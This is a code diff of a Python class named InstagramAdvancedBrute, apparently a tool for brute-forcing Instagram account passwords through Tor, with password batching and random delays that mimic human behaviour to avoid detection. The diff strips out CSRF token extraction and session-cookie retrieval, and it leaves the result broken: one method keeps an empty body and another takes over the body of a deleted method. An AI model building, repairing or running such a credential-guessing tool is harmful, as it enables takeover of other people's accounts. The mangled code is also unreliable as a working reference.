@@ -70,31 +70,8 @@ class InstagramAdvancedBrute:
             return None
     
     def _extract_tokens(self, html):
-        # More robust token extraction
-        soup = BeautifulSoup(html, 'html.parser')
-        scripts = soup.find_all('script')
         
-        csrf_token = None
-        rollout_hash = None
-        
-        for script in scripts:
-            if script.string and 'csrf_token' in script.string:
-                try:
-                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', script.string)
-                    if csrf_match:
-                        csrf_token = csrf_match.group(1)
-                except:
-                    pass
-                    
-            if script.string and 'rollout_hash' in script.string:
-                try:
-                    rollout_match = re.search(r'"rollout_hash":"([^"]+)"', script.string)
-                    if rollout_match:
-                        rollout_hash = rollout_match.group(1)
-                except:
-                    pass
-        
-        return csrf_token, rollout_hash
+
     
     def _generate_enc_password(self, password, time_key):
         # Updated password encryption method
@@ -147,17 +124,7 @@ class InstagramAdvancedBrute:
             return True
     
     def _get_web_session_id(self):
-        # Get a valid web session ID
-        try:
-            response = self._tor_request(self.base_url)
-            if response and response.status_code == 200:
-                cookies = response.cookies.get_dict()
-                return cookies.get('sessionid') or cookies.get('mid')
-        except:
-            pass
-        return None
-    
-    def _simulate_human_behavior(self):
+        
         # Add more realistic human-like behavior
         # Random mouse movements simulation time
         time.sleep(random.uniform(0.5, 2.0))
@@ -177,14 +144,7 @@ class InstagramAdvancedBrute:
             print("[!] Failed to access Instagram. Check your Tor connection.")
             return None
             
-            
-        # Get web session ID
-        web_session_id = self._get_web_session_id()
-        if not web_session_id:
-            print("[!] Warning: Could not get web session ID")
-            
-        print(f"[+] CSRF Token: {csrf_token[:10]}...")
-        print(f"[+] Rollout Hash: {rollout_hash}")
+        
         
         # Process passwords in smaller batches
         for i in range(0, len(self.passwords), 5):  # Reduced batch size
